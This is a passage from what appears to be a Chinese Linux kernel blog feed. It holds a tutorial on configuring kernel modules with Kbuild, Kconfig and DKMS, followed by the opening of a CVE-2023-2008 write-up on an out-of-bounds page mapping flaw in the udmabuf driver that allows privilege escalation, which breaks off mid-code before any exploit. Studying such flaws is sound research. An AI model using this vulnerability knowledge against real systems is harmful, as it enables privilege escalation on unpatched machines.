class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">proc_dma_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>proc_create_single(<span class="hljs-string">&quot;dma&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, proc_dma_show);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>__initcall(proc_dma_init);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>Kconfig 配置文件则通过 Kconfig 源文件进行生成，这类文件的语法定义参见 <a href="https://docs.kernel.org/kbuild/kconfig-language.html">Kconfig Language</a> ，下面是一个来自 <a href="https://github.com/arttnba3/Nornir-Rootkit">Nornir-Rootkit</a> 项目的简单的例子，其定义了一个编译选项 <code>CONFIG_NORNIR_PROCFS_UAPI</code> ，默认值为 <code>=y</code> ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config NORNIR_PROCFS_UAPI<br>    bool &quot;Enable user interface under /proc&quot;<br>    default y<br>    help <br>        Create a node `/proc/nornir` as a user interface<br></code></pre></td></tr></table></figure><p>在实际工程中的 Kconfig 文件通常更加复杂，包括多级的选项菜单定义，这通常是为了实现一个比较友好的用户菜单，这里我们依旧以 <a href="https://github.com/arttnba3/Nornir-Rootkit">Nornir-Rootkit</a> 项目为例，其基于 <a href="https://github.com/espressif/kconfig-frontends">kconfig-frontends</a> 项目（从内核 Kconfig 系统中拆分出来的独立项目，不过已年久失修）的图形化 Kconfig 的配置界面如下：</p><p><img src="https://s2.loli.net/2025/02/25/tGJEH4reK71mych.png"></p><blockquote><p>注：虽然 fork 出来的 <a href="https://github.com/espressif/kconfig-frontends">kconfig-frontends</a> 项目已经年久失修，但我们依然能用一些其他的开源 Kconfig 支持项目（或是自己再从内核里拆分一下）来为我们的代码使用 Kconfig 进行配置</p></blockquote><p>当 Kconfig 系统完成 Kconfig 配置文件的解读与设定之后，通常会生成一份正式的配置文件，其中给出了各个配置的值，对于 Linux kernel 而言这通常是源码目录下的 <code>.config</code> 文件，以 IRQ 子系统为例：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#</span><br><span class="hljs-comment"># IRQ subsystem</span><br><span class="hljs-comment">#</span><br>CONFIG_GENERIC_IRQ_PROBE=y<br>CONFIG_GENERIC_IRQ_SHOW=y<br>CONFIG_GENERIC_IRQ_EFFECTIVE_AFF_MASK=y<br>CONFIG_GENERIC_PENDING_IRQ=y<br>CONFIG_GENERIC_IRQ_MIGRATION=y<br></code></pre></td></tr></table></figure><p>下面我们改进一下上面的的代码结构，添加一个我们自己的 Kconfig 文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── Makefile<br>└── src<br>    ├── Kbuild<br>    ├── Kconfig<br>    ├── main.c<br>    └── sub<br>        ├── Kbuild<br>        ├── sub.c<br>        └── sub_sub<br>            ├── Kbuild<br>            └── sub_sub.c<br><br>4 directories, 8 files<br></code></pre></td></tr></table></figure><p>在这个 Kconfig 当中，我们配置一个二级菜单，以及两个编译配置选项：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">mainmenu &quot;A3KMOD Test Configuration&quot;<br><br>menu &quot;First-level sub directory&quot;<br><br>    config ENABLE_SUB<br>        bool &quot;Enable first-level sub directory&quot;<br>        default y<br><br>    menu &quot;Second-level sub directory&quot;<br>        depends on ENABLE_SUB<br><br>        config ENABLE_SUB_SUB<br>        bool &quot;Enable second-level sub directory&quot;<br>        default y<br><br>    endmenu<br><br>endmenu<br></code></pre></td></tr></table></figure><p>下面我们使用 <a href="https://pypi.org/project/kconfiglib/#history">kconfiglib</a> 来演示配置文件的生成，对于上面的配置文件我们有这样一个简单的二级菜单入口，其中第二级菜单依赖于第一级菜单的开启：</p><p><img src="https://s2.loli.net/2025/02/25/JtBSgapyAjmvFQb.png"></p><p>我们控制第一级菜单开启，而第二级菜单不开启，生成的 <code>.config</code> 文件如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># First-level sub directory</span><br><span class="hljs-meta">#</span><br>CONFIG_ENABLE_SUB=y<br><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># Second-level sub directory</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># CONFIG_ENABLE_SUB_SUB is not set</span><br><span class="hljs-meta"># <span class="hljs-keyword">end</span> of Second-level sub directory</span><br><span class="hljs-meta"># <span class="hljs-keyword">end</span> of First-level sub directory</span><br><br></code></pre></td></tr></table></figure><p>和前面类似，我们通过文件包含的形式将生成的 <code>.config</code> 配置文件纳入到我们的编译体系当中，我们将  <code>src/Kbuild</code>  修改如下：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># custom config options</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/../.config<br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br><br><span class="hljs-comment"># sub directory</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/Kbuild<br></code></pre></td></tr></table></figure><p>在 <code>src/sub/Kbuild</code> 当中，我们通过 <code>$(模块名)-(选项名)</code> 的方式 <strong>控制源文件的编译</strong> ，通过 <code>ccflags-$(选项名) += -D选项名</code> 的方式来<strong>在编译过程中动态定义该宏</strong> ：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-<span class="hljs-variable">$(CONFIG_ENABLE_SUB)</span> += sub/sub.o<br>ccflags-<span class="hljs-variable">$(CONFIG_ENABLE_SUB)</span> += -DCONFIG_ENABLE_SUB<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/sub_sub/Kbuild<br></code></pre></td></tr></table></figure><blockquote><p>当然，除了这个方式以外，kconfiglib 其实还提供了生成包含我们配置的 <code>config.h</code> 文件的功能，从而能够被更方便地整合到代码结构当中，但这需要我们为代码引入额外的头文件，某种程度上破坏了代码结构，因此笔者更喜欢通过编译参数添加变量的方式：）</p></blockquote><p>我们将 <code>src/main.c</code> 修改如下，以判定是否引入对应函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">static</span> __init <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello kernel world!\n&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB</span><br>    foo_sub();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> __exit <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye kernel world!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>对于  <code>src/sub/sub_sub/Kbuild</code>  我们同样进行这样的修改：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-<span class="hljs-variable">$(CONFIG_ENABLE_SUB_SUB)</span> += sub/sub_sub/sub_sub.o<br>ccflags-<span class="hljs-variable">$(CONFIG_ENABLE_SUB_SUB)</span> += -DCONFIG_ENABLE_SUB_SUB<br></code></pre></td></tr></table></figure><p>我们将 <code>src/sub/sub.c</code> 修改为如下，以判定是否引入该函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB_SUB</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub!\n&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB_SUB</span><br>    foo_sub_sub();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br> <br></code></pre></td></tr></table></figure><p>编译载入，可以看到确实没有调用二级目录的 <code>foo_sub_sub()</code> 函数：</p><p><img src="https://s2.loli.net/2025/02/25/B4aQLRM29JiyhZt.png"></p><p>重新配置 <code>.config</code> ，开启 <code>CONFIG_ENANLE_SUB_SUB</code> 选项：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># First-level sub directory</span><br><span class="hljs-comment">#</span><br>CONFIG_ENABLE_SUB=y<br><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Second-level sub directory</span><br><span class="hljs-comment">#</span><br>CONFIG_ENABLE_SUB_SUB=y<br><span class="hljs-comment"># end of Second-level sub directory</span><br><span class="hljs-comment"># end of First-level sub directory</span><br><br></code></pre></td></tr></table></figure><p>重新编译载入，可以看到二级目录的 <code>foo_sub_sub()</code> 函数被引入并调用：</p><p><img src="https://s2.loli.net/2025/02/25/MCDp6dn4ZyAuOvk.png"></p><p>灵活使用 Kbuild 与 Kconfig，我们便能比较优雅地编写一个内核模块：）</p><h1 id="0x02-使用-DKMS-为开源内核模块添加自动升级"><a href="#0x02-使用-DKMS-为开源内核模块添加自动升级" class="headerlink" title="0x02. 使用 DKMS 为开源内核模块添加自动升级"></a>0x02. 使用 DKMS 为开源内核模块添加自动升级</h1><p>内核模块需要针对当前内核版本进行编译，而内核版本的升级不一定会带着树外的内核模块一起重编译，从而导致内核版本与模块版本的不匹配而使得内核模块无法被载入（例如过去很多 Ubuntu 用户老生常谈的 NVIDIA 显卡驱动在内核升级之后就掉了的问题）</p><blockquote><p>笔者自己是有在 Gentoo 上遇到过这个问题，安装 DKMS 之前每次编译安装完内核之后还要手动重新安装一次 NVIDIA 显卡驱动</p><blockquote><p>不过 NVIDIA 仅为开源驱动提供了 DKMS 支持，对于闭源驱动而言仍旧需要在每次升级内核后手动安装，而开源驱动目前缺少了一部分电源管理相关的模块， <em>这会使得笔者的笔记本无法正常地进行休眠</em> ，因此笔者只好继续驻留在 NVIDIA 闭源驱动上，保持每次更新内核后都重新安装 NVIDIA 闭源驱动的习惯（虽然一行 <code>emerge</code> 就解决了）……</p></blockquote></blockquote><p>由 Dell 公司开发的 <a href="http://github.com/dell/dkms">Dynamic Kernel Module System</a> 尝试通过自动化地重编译内核模块来解决这个问题，作为一个构建安装内核模块的框架，其支持通过一些钩子以在内核更新后自动检测与重编译一些内核模块并安装，同时还为用户提供了一个简易的管理界面</p><p>DKMS 对内核模块的管理过程如下图状态机所示，这实质上代表了 DKMS 支持的五个命令：</p><p><img src="https://s2.loli.net/2025/02/25/SyhlZopYNu9vHc7.png"></p><ul><li>add：将树外模块添加到树中，模块状态变为 <code>Added</code> </li><li>build：构建内核模块，模块状态变为 <code>Built</code></li><li>install：安装内核模块，模块状态变为 <code>Installed</code></li><li>uninstall：卸载内核模块，模块状态变回 <code>Built</code></li><li>remove：从树中移除内核模块，模块状态变回 <code>Not in tree</code></li></ul><h2 id="基本的-DKMS-使用与配置文件编写"><a href="#基本的-DKMS-使用与配置文件编写" class="headerlink" title="基本的 DKMS 使用与配置文件编写"></a>基本的 DKMS 使用与配置文件编写</h2><p>要使用 DKMS 管理我们的内核模块，我们首先要准备一份这样的 <code>dkms.conf</code> 文件，这里还是以我们前面的内核模块为例，变量字面含义都比较明显所以笔者这里就不再赘述了：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># package information</span><br>PACKAGE_NAME=<span class="hljs-string">&quot;a3kmod&quot;</span><br>PACKAGE_VERSION=<span class="hljs-string">&quot;1.1.4&quot;</span><br><br><span class="hljs-comment"># basic configuration</span><br>AUTOINSTALL=<span class="hljs-string">&quot;yes&quot;</span><br><br><span class="hljs-comment"># module information</span><br>BUILT_MODULE_NAME[0]=<span class="hljs-string">&quot;$PACKAGE_NAME&quot;</span><br>BUILT_MODULE_LOCATION=<span class="hljs-string">&quot;src/&quot;</span><br><br><span class="hljs-comment"># compilation configuration</span><br>MAKE[0]=<span class="hljs-string">&quot;make -C $&#123;kernel_source_dir&#125; M=$&#123;dkms_tree&#125;/$&#123;PACKAGE_NAME&#125;/$&#123;PACKAGE_VERSION&#125;/build/src&quot;</span> <span class="hljs-comment"># source code will be copied to /build/, so our M=/build/src</span><br>CLEAN=<span class="hljs-string">&quot;make -C $&#123;kernel_source_dir&#125; M=$&#123;dkms_tree&#125;/$&#123;PACKAGE_NAME&#125;/$&#123;PACKAGE_VERSION&#125;/build/src clean&quot;</span> <span class="hljs-comment"># source code will be copied to /build/, so our M=/build/src</span><br>DEST_MODULE_LOCATION=<span class="hljs-string">&quot;/extra&quot;</span> <span class="hljs-comment"># relative path to /lib/modules/$(shell uname -r)/</span><br></code></pre></td></tr></table></figure><p>要使用 DKMS，首先我们的内核模块源码 <strong>应当位于 &#x2F;usr&#x2F;src 目录下，且格式应当为</strong> <code>/usr/src/&lt;PACKAGE_NAME&gt;-&lt;PACKAGE_VERSION&gt;</code>，因此我们的测试模块应当放在 <code>/usr/src/a3kmod-1.1.4</code> 目录下：</p><blockquote><p>这里的 <code>.config</code> 文件你可以选择准备一份默认配置，而不需要再手动选择生成选项</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree -a /usr/src/a3kmod-1.1.4/</span><br>/usr/src/a3kmod-1.1.4/<br>├── .config<br>├── Makefile<br>├── dkms.conf<br>└── src<br>    ├── Kbuild<br>    ├── Kconfig<br>    ├── main.c<br>    └── sub<br>        ├── Kbuild<br>        ├── sub.c<br>        └── sub_sub<br>            ├── Kbuild<br>            └── sub_sub.c<br><br>4 directories, 10 files<br></code></pre></td></tr></table></figure><p>接下来将我们的内核模块添加到 DKMS 追踪列表当中，从而在后续能够自动更新：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms add -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br>Creating symlink /var/lib/dkms/a3kmod/1.1.4/source -&gt; /usr/src/a3kmod-1.1.4<br></code></pre></td></tr></table></figure><p>然后开始构建内核模块，需要注意的是在此阶段我们尚未为内核模块添加签名支持：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms build -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br>The kernel is built without module signing facility, modules won&#x27;t be signed<br><br>Cleaning build area... done.<br>Building module(s)... done.<br>Cleaning build area... done.<br></code></pre></td></tr></table></figure><p>完成构建之后进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms install -m a3kmod -v 1.1.4 <span class="hljs-comment"># replace with your PACKAGE_NAME and PACKAGE_VERSION</span></span><br><br>Installing /lib/modules/6.6.67-gentoo-gentoo-dist/extra/a3kmod.ko.xz<br>Running depmod.... done.<br></code></pre></td></tr></table></figure><p>此时我们的测试模块 <code>a3kmod</code> 就进入到树中了，我们可以使用 <code>dkms status</code> 命令查看 dkms 管理的内核模块：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dkms status</span><br>a3kmod/1.1.4, 6.6.67-gentoo-gentoo-dist, x86_64: installed<br></code></pre></td></tr></table></figure><p>不过此时我们的内核模块尚未装载到内核当中，我们可以像其他模块那样使用 <code>modprobe</code> 来手动地即时 <code>insmod</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo modprobe a3kmod</span><br></code></pre></td></tr></table></figure><p>简单测试一下，可以发现确实被成功载入：</p><p><img src="https://s2.loli.net/2025/02/25/A3PTexqnc9JwFyV.png"></p><blockquote><p>不过重启后我们的内核模块并不会被自动载入，因为这不属于 DKMS 的职能范围，我们若是需要这个功能，则可以在 <code>/etc/modules-load.d/</code> 中新建一个 <code>a3kmod.conf</code> 文件，并添加我们的内核模块名：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">a3kmod<br></code></pre></td></tr></table></figure><p>此时再重启便能看到我们的内核模块被自动载入了：</p><p><img src="https://s2.loli.net/2025/02/25/ocmPAKM4B6vp7qk.png"></p></blockquote><p>接下来我们测试一下内核更新后的自动编译，我们编译一个新版本的内核并安装，之后重启：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make -j$(<span class="hljs-built_in">nproc</span>) bzImage &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>) modules</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make modules_install</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo make install</span><br></code></pre></td></tr></table></figure><p>在 <code>make install</code> 的日志中我们可以看到 dkms 的输出内容（这里忘了截图了被后面的输出覆盖了），重启计算机，可以看到我们的内核模块成功地在新内核上被载入，而无需我们再手动进行编译：</p><p><img src="https://s2.loli.net/2025/02/25/7mnXGaWCN9q6lAc.png"></p><h2 id="为内核模块添加签名支持（🕊）"><a href="#为内核模块添加签名支持（🕊）" class="headerlink" title="为内核模块添加签名支持（🕊）"></a>为内核模块添加签名支持（🕊）</h2><h2 id="打包一个支持-DKMS-的内核模块的软件包（🕊）"><a href="#打包一个支持-DKMS-的内核模块的软件包（🕊）" class="headerlink" title="打包一个支持 DKMS 的内核模块的软件包（🕊）"></a>打包一个支持 DKMS 的内核模块的软件包（🕊）</h2><blockquote><p>按各大发行版要求去打成对应的格式就行，没什么好说的：）</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;我在 5:20 make install—— 13：14 准时 kernel panic&lt;/p&gt;</summary>
    
    
    
    <category term="DEV" scheme="https://arttnba3.github.io/categories/DEV/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x0B】CVE-2023-2008 漏洞复现及简要分析</title>
    <link href="https://arttnba3.github.io/2024/12/31/CVE-0X0B-CVE-2023-2008/"/>
    <id>https://arttnba3.github.io/2024/12/31/CVE-0X0B-CVE-2023-2008/</id>
    <published>2024-12-31T09:34:19.000Z</published>
    <updated>2025-01-01T17:38:10.204Z</updated>
    
    <content type="html"><![CDATA[<p>Linus 哥你骗我们干嘛！这 DMA-BUF 他也不无敌啊！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-2008">CVE-2023-2008</a> 是一个发生在 Linux 内核的 <a href="https://docs.kernel.org/driver-api/dma-buf.html">dma-buf 子系统</a> 的 <code>/dev/udmabuf</code> 设备驱动中的一个漏洞，由于缺乏对范围扩张后的 <code>udmabuf::pages</code> 的边界检查，导致攻击者可以完成越界页面指针映射，从而完成越权文件写入攻击以进行提权；该漏洞影响版本为 <code>4.20 ~ 5.4.201</code> 、<code>5.5 ~ 5.10.126</code> 、<code>5.11~5.15.50</code>、<code>5.16 ~ 5.18.7</code> ，本文我们选用 <code>5.11</code> 版本的内核源码进行分析</p><p>在开始之前，请先在 <a href="https://arttnba3.cn/2024/11/30/OS-0X06-LINUX-DMABUF/">这篇博客</a> 当中补充一些 dma-buf 与 udmabuf 的基础知识</p><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01. 漏洞分析"></a>0x01. 漏洞分析</h1><h2 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h2><p>在 <code>udmabuf</code> 驱动当中，<code>udmabuf</code> 结构体被用以表示一份与一个 <code>DMA-BUF</code> 绑定的共享内存：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">udmabuf</span> &#123;</span><br><span class="hljs-type">pgoff_t</span> pagecount;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> **<span class="hljs-title">pages</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/12/31/RQylzJUsh8tNSFM.png"></p><p>众所周知 <code>dma_buf</code> 内存在用户态一般通过 <code>mmap()</code> 访问，当我们第一次读写 <code>mmap()</code> 的 <code>udmabuf</code> 所给的 <code>dma_buf</code> 的内存时，会触发缺页异常以分配内存页，因为在创建 <code>dma_buf</code> 时有如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">ksys_ioctl</span>()<br><span class="hljs-built_in">do_vfs_ioctl</span>()<br><span class="hljs-built_in">vfs_ioctl</span>()<br>filp-&gt;f_op-&gt;<span class="hljs-built_in">unlocked_ioctl</span>()<span class="hljs-comment">/* udmabuf_misc.fops = &amp;udmabuf_fops */</span><br><span class="hljs-built_in">udmabuf_ioctl</span>()<br><span class="hljs-built_in">udmabuf_ioctl_create</span>()<span class="hljs-comment">/* 